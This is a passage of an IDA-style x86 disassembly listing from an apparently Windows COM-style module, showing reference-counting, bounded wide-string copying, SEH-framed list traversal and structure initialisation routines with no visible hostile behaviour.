                jz      short loc_1991E

loc_19909:                              ; CODE XREF: sub_198D8+20↑j
                mov     eax, [ebp+arg_0]
                mov     [esi], eax
                mov     ecx, [eax]
                mov     edx, [ecx+4]
                push    eax
                call    edx
                pop     edi
                xor     eax, eax
                pop     esi
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_1991E:                              ; CODE XREF: sub_198D8+2F↑j
                pop     edi
                mov     eax, 80004002h
                pop     esi
                pop     ebp
                retn    0Ch
sub_198D8       endp

; ---------------------------------------------------------------------------
                db 0Fh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19938       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                add     eax, 4
                push    eax
                call    dword ptr ds:1001164h
                pop     ebp
                retn    4
sub_19938       endp

; ---------------------------------------------------------------------------
                db 0Ah dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19958       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                lea     eax, [edi+4]
                push    eax
                call    dword ptr ds:1001160h
                mov     esi, eax
                test    esi, esi
                jnz     short loc_1997D
                mov     ecx, [edi+8]
                push    edi
                call    sub_18108
                mov     eax, esi

loc_1997D:                              ; CODE XREF: sub_19958+18↑j
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_19958       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_19988       proc near               ; CODE XREF: sub_19C38+2A↓p
                xor     eax, eax
                test    ecx, ecx
                push    esi
                mov     esi, ecx
                jz      short loc_199AB
                lea     esp, [esp+0]

loc_19998:                              ; CODE XREF: sub_19988+1B↓j
                cmp     [edx], ax
                jz      short loc_199A7
                add     edx, 2
                sub     ecx, 1
                jnz     short loc_19998
                jmp     short loc_199AB
; ---------------------------------------------------------------------------

loc_199A7:                              ; CODE XREF: sub_19988+13↑j
                test    ecx, ecx
                jnz     short loc_199B0

loc_199AB:                              ; CODE XREF: sub_19988+7↑j
                                        ; sub_19988+1D↑j
                mov     eax, 80070057h

loc_199B0:                              ; CODE XREF: sub_19988+21↑j
                test    edi, edi
                jz      short loc_199C4
                test    eax, eax
                jl      short loc_199BE
                sub     esi, ecx
                mov     [edi], esi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_199BE:                              ; CODE XREF: sub_19988+2E↑j
                mov     dword ptr [edi], 0

loc_199C4:                              ; CODE XREF: sub_19988+2A↑j
                pop     esi
                retn
sub_19988       endp

; ---------------------------------------------------------------------------
                db 12h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_199D8       proc near               ; CODE XREF: sub_1A558+107↓p

var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     esi, ecx
                mov     ebx, [esi+224h]
                push    220h
                push    esi
                mov     [ebp+var_4], ebx
                call    sub_18F88
                mov     edi, eax
                add     edi, ebx
                xor     ebx, ebx
                cmp     [ebp+var_4], ebx
                jbe     short loc_19A30
                mov     [ebp+var_4], ebx
                lea     ecx, [ecx+0]

loc_19A08:                              ; CODE XREF: sub_199D8+56↓j
                mov     eax, [esi+220h]
                add     eax, [ebp+var_4]
                push    0B3Ch
                push    eax
                call    sub_18F88
                add     [ebp+var_4], 0B3Ch
                add     ebx, 1
                add     edi, eax
                cmp     ebx, [esi+224h]
                jb      short loc_19A08

loc_19A30:                              ; CODE XREF: sub_199D8+28↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_199D8       endp

; ---------------------------------------------------------------------------
                db 0Fh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19A48       proc near               ; CODE XREF: sub_18778+9F↑p
                                        ; sub_1A278+A1↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                mov     eax, [esi+8]
                test    eax, eax
                jz      short loc_19A66
                mov     ecx, [eax]
                mov     edx, [ecx+8]
                push    eax
                call    edx
                mov     dword ptr [esi+8], 0

loc_19A66:                              ; CODE XREF: sub_19A48+D↑j
                mov     eax, [ebp+arg_0]
                mov     [esi+8], eax
                mov     ecx, [eax]
                mov     edx, [ecx+4]
                push    eax
                call    edx
                mov     ecx, [esi+8]
                call    sub_17AF8
                mov     ecx, [esi+8]
                mov     [esi+0B00h], eax
                call    sub_17AF8
                mov     [esi+0B14h], eax
                pop     esi
                pop     ebp
                retn    4
sub_19A48       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19AA8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     edx, [ebp+arg_4]
                test    edx, edx
                jnz     short loc_19ABD
                mov     eax, 80070057h
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_19ABD:                              ; CODE XREF: sub_19AA8+A↑j
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx+60h]
                test    eax, eax
                jz      short loc_19AD0
                test    dword ptr [ecx+64h], 200000h
                jz      short loc_19AD3

loc_19AD0:                              ; CODE XREF: sub_19AA8+1D↑j
                mov     eax, [ecx+40h]

loc_19AD3:                              ; CODE XREF: sub_19AA8+26↑j
                mov     [edx], eax
                xor     eax, eax
                pop     ebp
                retn    8
sub_19AA8       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19AE8       proc near               ; CODE XREF: sub_19CE8+B↓p
                                        ; sub_19CE8+1B↓j ...

var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AC18h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 1Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                mov     [ebp+var_28], esi
                xor     ebx, ebx
                mov     [ebp+var_20], ebx
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_4], ebx
                mov     eax, [esi+0Ch]
                mov     eax, [eax]
                lea     ebx, [ebx+0]

loc_19B38:                              ; CODE XREF: sub_19AE8+65↓j
                test    eax, eax
                jz      short loc_19B4F
                mov     edi, [eax]
                mov     ecx, [esi+8]
                push    ecx
                push    eax
                call    sub_17DC8
                add     esp, 8
                mov     eax, edi
                jmp     short loc_19B38
; ---------------------------------------------------------------------------

loc_19B4F:                              ; CODE XREF: sub_19AE8+52↑j
                mov     eax, 0FFFFFFFEh
                mov     [ebp+var_4], eax
                jmp     short loc_19B99
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_24], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_24]
                mov     [ebp+var_1C], esi
                cmp     esi, 0C00000FDh
                jnz     short loc_19B80
                call    dword ptr ds:10011F4h

loc_19B80:                              ; CODE XREF: sub_19AE8+90↑j
                test    esi, esi
                jl      short loc_19B8B
                mov     [ebp+var_1C], 80004005h

loc_19B8B:                              ; CODE XREF: sub_19AE8+9A↑j
                mov     eax, 0FFFFFFFEh
                mov     [ebp+var_4], eax
                mov     esi, [ebp+var_28]
                mov     ebx, [ebp+var_20]

loc_19B99:                              ; CODE XREF: sub_19AE8+6F↑j
                test    ebx, ebx
                jl      short loc_19BA3
                mov     ebx, [ebp+var_1C]
                mov     [ebp+var_20], ebx

loc_19BA3:                              ; CODE XREF: sub_19AE8+B3↑j
                xor     edi, edi
                mov     [ebp+var_4], 1
                mov     edx, [esi+0Ch]
                mov     [edx], edi
                mov     ecx, [esi+0Ch]
                mov     [esi+10h], ecx
                mov     [ebp+var_4], eax
                jmp     short loc_19BF5
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_2C], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_2C]
                mov     edi, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_19BE2
                call    dword ptr ds:10011F4h

loc_19BE2:                              ; CODE XREF: sub_19AE8+F2↑j
                test    esi, esi
                jl      short loc_19BEB
                mov     edi, 80004005h

loc_19BEB:                              ; CODE XREF: sub_19AE8+FC↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     ebx, [ebp+var_20]

loc_19BF5:                              ; CODE XREF: sub_19AE8+D2↑j
                test    ebx, ebx
                jl      short loc_19BFB
                mov     ebx, edi

loc_19BFB:                              ; CODE XREF: sub_19AE8+10F↑j
                mov     eax, ebx
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_19AE8       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_19C18       proc near               ; CODE XREF: sub_1A0C8+46↓p
                lea     eax, [ecx+8]
                mov     ecx, [eax]
                lea     edx, ds:8[ecx*8]
                push    edx
                push    eax
                call    sub_18F88
                retn
sub_19C18       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19C38       proc near               ; CODE XREF: sub_19F98+4F↓p
                                        ; sub_19F98+66↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                xor     eax, eax
                test    ebx, ebx
                push    edi
                jz      short loc_19C51
                cmp     ebx, 7FFFFFFFh
                jbe     short loc_19C56

loc_19C51:                              ; CODE XREF: sub_19C38+F↑j
                mov     eax, 80070057h

loc_19C56:                              ; CODE XREF: sub_19C38+17↑j
                test    eax, eax
                jl      short loc_19C6C
                mov     edx, [ebp+arg_0]
                lea     edi, [ebp+arg_4]
                mov     ecx, ebx
                call    sub_19988
                mov     esi, [ebp+arg_4]
                jmp     short loc_19C6E
; ---------------------------------------------------------------------------

loc_19C6C:                              ; CODE XREF: sub_19C38+20↑j
                xor     esi, esi

loc_19C6E:                              ; CODE XREF: sub_19C38+32↑j
                test    eax, eax
                jl      short loc_19CD8
                mov     eax, [ebp+arg_0]
                mov     ecx, ebx
                sub     ecx, esi
                lea     edx, [eax+esi*2]
                mov     eax, 0
                jz      short loc_19CCB
                mov     edi, ecx
                sub     edi, ebx
                mov     ebx, [ebp+arg_8]
                lea     edi, [edi+esi+7FFFFFFFh]
                sub     ebx, edx
                jmp     short loc_19C98
; ---------------------------------------------------------------------------
                align 4

loc_19C98:                              ; CODE XREF: sub_19C38+5B↑j
                                        ; sub_19C38+7B↓j
                test    edi, edi
                jz      short loc_19CC7
                movzx   esi, word ptr [ebx+edx]
                test    si, si
                jz      short loc_19CC7
                mov     [edx], si
                sub     ecx, 1
                add     edx, 2
                sub     edi, 1
                test    ecx, ecx
                jnz     short loc_19C98
                pop     edi
                sub     edx, 2
                pop     esi
                mov     eax, 8007007Ah
                mov     [edx], cx
                pop     ebx
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_19CC7:                              ; CODE XREF: sub_19C38+62↑j
                                        ; sub_19C38+6B↑j
                test    ecx, ecx
                jnz     short loc_19CD3

loc_19CCB:                              ; CODE XREF: sub_19C38+49↑j
                sub     edx, 2
                mov     eax, 8007007Ah

loc_19CD3:                              ; CODE XREF: sub_19C38+91↑j
                mov     word ptr [edx], 0

loc_19CD8:                              ; CODE XREF: sub_19C38+38↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    0Ch
sub_19C38       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_19CE8       proc near               ; CODE XREF: sub_18108+4E↑p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                lea     ecx, [esi+0AF8h]
                call    sub_19AE8
                test    eax, eax
                jnz     short loc_19D08
                lea     ecx, [esi+0B0Ch]
                pop     esi
                jmp     sub_19AE8
; ---------------------------------------------------------------------------

loc_19D08:                              ; CODE XREF: sub_19CE8+12↑j
                pop     esi
                retn
sub_19CE8       endp

; ---------------------------------------------------------------------------
                db 0Eh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19D18       proc near               ; CODE XREF: sub_19E98+8C↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                mov     [ecx+228h], eax
                lea     edx, [ecx+14h]
                push    edi
                xor     eax, eax
                mov     edi, 105h
                sub     ebx, edx

loc_19D38:                              ; CODE XREF: sub_19D18+3C↓j
                lea     esi, [edi+7FFFFEF9h]
                test    esi, esi
                jz      short loc_19D58
                movzx   esi, word ptr [ebx+edx]
                test    si, si
                jz      short loc_19D58
                mov     [edx], si
                add     edx, 2
                sub     edi, 1
                jnz     short loc_19D38
                jmp     short loc_19D5C
; ---------------------------------------------------------------------------

loc_19D58:                              ; CODE XREF: sub_19D18+28↑j
                                        ; sub_19D18+31↑j
                test    edi, edi
                jnz     short loc_19D64

loc_19D5C:                              ; CODE XREF: sub_19D18+3E↑j
                sub     edx, 2
                mov     eax, 8007007Ah

loc_19D64:                              ; CODE XREF: sub_19D18+42↑j
                test    eax, eax
                mov     word ptr [edx], 0
                jnz     short loc_19D8F
                mov     edx, [ebp+arg_8]
                mov     esi, [edx]
                mov     [ecx], esi
                mov     esi, [edx+4]
                mov     [ecx+4], esi
                mov     esi, [edx+8]
                mov     [ecx+8], esi
                mov     edx, [edx+0Ch]
                mov     [ecx+0Ch], edx
                mov     edx, [ebp+arg_C]
                mov     [ecx+220h], edx

loc_19D8F:                              ; CODE XREF: sub_19D18+53↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    10h
sub_19D18       endp

; ---------------------------------------------------------------------------
                db 12h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19DA8       proc near               ; CODE XREF: sub_1A498+56↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = word ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     eax, [ecx+224h]
                cmp     eax, [ecx+228h]
                jnz     short loc_19DC7
                mov     eax, 80004005h
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_19DC7:                              ; CODE XREF: sub_19DA8+12↑j
                mov     edx, eax
                imul    edx, 0B3Ch
                add     edx, [ecx+220h]
                push    ebx
                add     eax, 1
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                mov     [ecx+224h], eax
                xor     ebx, ebx
                lea     eax, [edx+6]
                mov     esi, 105h
                mov     [ebp+var_4], ebx
                sub     edi, eax
                jmp     short loc_19DF8
; ---------------------------------------------------------------------------
                align 4

loc_19DF8:                              ; CODE XREF: sub_19DA8+4B↑j
                                        ; sub_19DA8+6C↓j
                lea     ecx, [esi+7FFFFEF9h]
                test    ecx, ecx
                jz      short loc_19E18
                movzx   ecx, word ptr [edi+eax]
                cmp     cx, bx
                jz      short loc_19E18
                mov     [eax], cx
                add     eax, 2
                sub     esi, 1
                jnz     short loc_19DF8
                jmp     short loc_19E1C
; ---------------------------------------------------------------------------

loc_19E18:                              ; CODE XREF: sub_19DA8+58↑j
                                        ; sub_19DA8+61↑j
                cmp     esi, ebx
                jnz     short loc_19E26

loc_19E1C:                              ; CODE XREF: sub_19DA8+6E↑j
                sub     eax, 2
                mov     [ebp+var_4], 8007007Ah

loc_19E26:                              ; CODE XREF: sub_19DA8+72↑j
                mov     edi, [ebp+arg_4]
                mov     [eax], bx
                lea     eax, [edx+316h]
                mov     esi, 105h
                sub     edi, eax

loc_19E39:                              ; CODE XREF: sub_19DA8+AD↓j
                lea     ecx, [esi+7FFFFEF9h]
                test    ecx, ecx
                jz      short loc_19E59
                movzx   ecx, word ptr [edi+eax]
                test    cx, cx
                jz      short loc_19E59
                mov     [eax], cx
                add     eax, 2
                sub     esi, 1
                jnz     short loc_19E39
                jmp     short loc_19E5D
; ---------------------------------------------------------------------------

loc_19E59:                              ; CODE XREF: sub_19DA8+99↑j
                                        ; sub_19DA8+A2↑j
                test    esi, esi
                jnz     short loc_19E65

loc_19E5D:                              ; CODE XREF: sub_19DA8+AF↑j
                sub     eax, 2
                mov     ebx, 8007007Ah

loc_19E65:                              ; CODE XREF: sub_19DA8+B3↑j
                mov     word ptr [eax], 0
                mov     ax, [ebp+arg_8]
                mov     [edx+4], ax
                mov     eax, [ebp+var_4]
                test    eax, eax
                jl      short loc_19E7B
                mov     eax, ebx

loc_19E7B:                              ; CODE XREF: sub_19DA8+CF↑j
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_19DA8       endp

; ---------------------------------------------------------------------------
                db 14h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19E98       proc near

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AC40h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_4], ebx
                mov     esi, [ebp+arg_0]
                mov     ecx, [esi+8]
                call    sub_17AF8
                push    eax
                xor     ecx, ecx
                mov     edi, [ebp+arg_4]
                mov     eax, edi
                mov     edx, 0B3Ch
                mul     edx
                seto    cl
                neg     ecx
                or      ecx, eax
                push    ecx
                call    sub_17DA8
                add     esp, 8
                test    eax, eax
                jnz     short loc_19F14
                mov     eax, 8007000Eh
                mov     [ebp+var_1C], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_19F6E
; ---------------------------------------------------------------------------

loc_19F14:                              ; CODE XREF: sub_19E98+69↑j
                push    eax
                mov     eax, [ebp+arg_C]
                push    eax
                mov     ecx, [ebp+arg_8]
                push    ecx
                push    edi
                lea     ecx, [esi+8C4h]
                call    sub_19D18
                mov     [ebp+var_1C], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_19F6E
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_20], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_19F5B
                call    dword ptr ds:10011F4h

loc_19F5B:                              ; CODE XREF: sub_19E98+BB↑j
                test    esi, esi
                jl      short loc_19F64
                mov     ebx, 80004005h

loc_19F64:                              ; CODE XREF: sub_19E98+C5↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]

loc_19F6E:                              ; CODE XREF: sub_19E98+7A↑j
                                        ; sub_19E98+9B↑j
                test    eax, eax
                jl      short loc_19F74
                mov     eax, ebx

loc_19F74:                              ; CODE XREF: sub_19E98+D8↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
sub_19E98       endp

; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19F98       proc near               ; CODE XREF: sub_1AA68+C6↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, ecx
                cmp     dword ptr [ebx+0B28h], 0
                jnz     short loc_19FB0
                xor     eax, eax
                pop     ebx
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_19FB0:                              ; CODE XREF: sub_19F98+F↑j
                mov     eax, [ebx+0B24h]
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                mov     edi, [ebp+arg_4]
                push    eax
                push    1002290h
                push    edi
                push    esi
                call    sub_19458
                add     esp, 10h
                test    eax, eax
                jl      short loc_1A047
                mov     ecx, [ebx+0B24h]
                cmp     ecx, 20000001h
                jnz     short loc_19FF3
                push    1002238h
                push    edi
                push    esi
                call    sub_19C38
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_19FF3:                              ; CODE XREF: sub_19F98+46↑j
                test    ecx, ecx
                jnz     short loc_1A00A
                push    10021A8h
                push    edi
                push    esi
                call    sub_19C38
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_1A00A:                              ; CODE XREF: sub_19F98+5D↑j
                xor     esi, esi
                jmp     short loc_1A018
; ---------------------------------------------------------------------------
                db 8Dh, 0A4h, 24h, 4 dup(0)
                align 4

loc_1A018:                              ; CODE XREF: sub_19F98+74↑j
                                        ; sub_19F98+AD↓j
                mov     ecx, [esi+1002138h]
                mov     edx, ecx
                and     edx, [ebx+0B24h]
                cmp     ecx, edx
                jnz     short loc_1A03F
                mov     eax, [esi+100213Ch]
                mov     ecx, [ebp+arg_0]
                push    eax
                push    edi
                push    ecx
                call    sub_19C38
                test    eax, eax
                jl      short loc_1A047

loc_1A03F:                              ; CODE XREF: sub_19F98+90↑j
                add     esi, 8
                cmp     esi, 70h ; 'p'
                jb      short loc_1A018

loc_1A047:                              ; CODE XREF: sub_19F98+38↑j
                                        ; sub_19F98+A5↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn    8
sub_19F98       endp

; ---------------------------------------------------------------------------
                db 0Ah dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1A058       proc near               ; CODE XREF: sub_1A3D8+21↓p
                                        ; sub_1A438+21↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                mov     eax, [esi+10h]
                mov     ecx, [eax+8]
                cmp     ecx, [eax+0Ch]
                push    edi
                jb      short loc_1A0A2
                mov     ecx, [esi+8]
                test    ecx, ecx
                jz      short loc_1A0BC
                mov     edi, [esi]
                lea     edx, ds:10h[edi*8]
                push    edx
                call    sub_18CA8
                test    eax, eax
                jz      short loc_1A0BC
                mov     dword ptr [eax], 0
                mov     dword ptr [eax+4], 0
                mov     dword ptr [eax+8], 0
                mov     [eax+0Ch], edi
                mov     ecx, [esi+10h]
                mov     [ecx], eax
                mov     [esi+10h], eax

loc_1A0A2:                              ; CODE XREF: sub_1A058+F↑j
                mov     eax, [esi+10h]
                mov     ecx, [eax+8]
                lea     edx, [ecx+1]
                mov     [eax+8], edx
                mov     eax, [esi+10h]
                add     dword ptr [esi+4], 1
                pop     edi
                lea     eax, [eax+ecx*8+10h]
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_1A0BC:                              ; CODE XREF: sub_1A058+16↑j
                                        ; sub_1A058+29↑j
                pop     edi
                xor     eax, eax
                pop     esi
                retn
sub_1A058       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A0C8       proc near               ; CODE XREF: sub_1A558+6E↓p
                                        ; sub_1A558+82↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AC60h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     edi, edi
                mov     [ebp+var_4], edi
                mov     esi, [ecx+0Ch]

loc_1A105:                              ; CODE XREF: sub_1A0C8+50↓j
                mov     [ebp+var_1C], esi
                cmp     esi, edi
                jz      short loc_1A149
                mov     ecx, esi
                call    sub_19C18
                mov     [esi+4], eax
                mov     esi, [esi]
                jmp     short loc_1A105
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_20], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     edi, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_1A140
                call    dword ptr ds:10011F4h

loc_1A140:                              ; CODE XREF: sub_1A0C8+70↑j
                test    esi, esi
                jl      short loc_1A149
                mov     edi, 80004005h

loc_1A149:                              ; CODE XREF: sub_1A0C8+42↑j
                                        ; sub_1A0C8+7A↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, edi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_1A0C8       endp

; ---------------------------------------------------------------------------
                db 14h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1A178       proc near               ; CODE XREF: sub_1A278+1E↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                push    edi
                xor     edi, edi
                push    400h
                mov     dword ptr [esi], 2
                mov     [esi+4], edi
                mov     [esi+8], edi
                mov     [esi+0Ch], edi
                mov     [esi+10h], edi
                mov     [esi+14h], edi
                mov     [esi+18h], edi
                mov     [esi+1Ch], edi
                mov     [esi+20h], edi
                mov     [esi+24h], edi
                mov     [esi+28h], edi
                mov     [esi+2Ch], edi
                mov     [esi+30h], edi
                mov     [esi+34h], edi
                mov     [esi+38h], edi
                mov     [esi+3Ch], edi
                mov     [esi+48h], edi
                mov     [esi+4Ch], edi
                mov     [esi+50h], edi
                mov     [esi+54h], edi
                mov     [esi+58h], edi
                mov     [esi+5Ch], edi
                mov     [esi+60h], edi
                mov     [esi+64h], edi
                mov     [esi+68h], edi
                mov     [esi+6Ch], edi
                mov     [esi+70h], edi
                mov     [esi+74h], edi
                mov     [esi+78h], edi
                mov     [esi+7Ch], edi
                mov     [esi+80h], edi
                mov     [esi+84h], edi
                mov     [esi+8Ch], edi
                mov     [esi+90h], edi
                lea     eax, [esi+0A4h]
                push    edi
                push    eax
                mov     [esi+94h], edi
                mov     [esi+98h], edi
                mov     [esi+9Ch], edi
                mov     dword ptr [esi+0A0h], 80h
                call    sub_16746
                push    400h
                lea     ecx, [esi+4B4h]
                push    edi
                push    ecx
                mov     [esi+4A4h], edi
                mov     [esi+4A8h], edi
                mov     [esi+4ACh], edi
                mov     dword ptr [esi+4B0h], 80h
                call    sub_16746
                push    22Ch
                lea     edx, [esi+8B8h]
                push    edi
                push    edx
                call    sub_16746
                add     esp, 24h
                mov     [esi+40h], edi
                mov     [esi+44h], edi
                pop     edi
                mov     eax, esi
                pop     esi
                retn
sub_1A178       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1A278       proc near               ; CODE XREF: sub_18098+24↑p
                                        ; sub_18778+64↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                push    edi
                xor     edi, edi
                lea     ecx, [esi+0Ch]
                mov     dword ptr [esi], 1002800h
                mov     dword ptr [esi+4], 1
                mov     [esi+8], edi
                call    sub_1A178
                mov     [esi+0AFCh], edi
                mov     [esi+0B00h], edi
                lea     eax, [esi+0A0h]
                mov     [esi+0B04h], eax
                mov     [esi+0B08h], eax
                mov     ecx, 200h
                mov     [esi+0AF8h], ecx
                lea     eax, [esi+4B0h]
                mov     [esi+0B18h], eax
                mov     [esi+0B1Ch], eax
                mov     eax, [ebp+arg_4]
                mov     [esi+0B0Ch], ecx
                mov     [esi+0B10h], edi
                mov     [esi+0B14h], edi
                mov     [esi+0B20h], eax
                mov     eax, [ebp+arg_0]
                cmp     eax, edi
                mov     [esi+0B24h], edi
                mov     [esi+0B28h], edi
                mov     [esi+0B2Ch], edi
                mov     [esi+0B30h], edi
